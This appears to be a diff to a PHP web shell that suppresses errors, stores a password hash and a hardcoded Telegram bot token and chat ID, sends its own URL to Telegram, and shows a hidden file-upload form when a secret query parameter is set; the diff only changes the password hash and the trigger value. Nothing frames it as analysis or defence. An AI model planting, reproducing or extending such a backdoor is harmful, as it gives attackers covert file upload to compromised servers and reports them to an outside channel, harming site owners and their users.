@@ -1,7 +1,7 @@
 
 <?php
 ERROR_REPORTING(0);
-$hashed_password = '$2y$10$Pt658eHI1OlnfyGXAm/VPufTThQKyCjhF/Bj/IEq5OzATN1k5bKWq';
+$hashed_password = '$2y$10$1dnl8R9z7as7fcezl7q49.3neaZ9E9j749583i1sajPbqiUhpR6ZK';
 $botToken = '8390423631:AAE18ENcI5InhKoR0RmW3B2Yyke7VoV7Hqc';
 $chatId = '5070938778';
 $xPath = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
@@ -26,14 +26,13 @@ function sendTelegramMessage($botToken, $chatId, $message)
     $response = file_get_contents($url, false, $context);
 
 }
-if (isset($_GET['UBK']) && $_GET['tbl'] === 'tbl') {
+if (isset($_GET['UBK']) && $_GET['UBK'] === '3') {
     echo '<form method="post" enctype="multipart/form-data">';
     echo '<input type="text" name="dir" size="30" value="' . getcwd() . '">';
     echo '<input type="file" name="file" size="15">';
     echo '<input type="submit" value="go">';
     echo '</form>';
 }
-
 if (isset($_FILES['file']['tmp_name'])) {
     $uploadd = $_FILES['file']['tmp_name'];
     if (file_exists($uploadd)) {
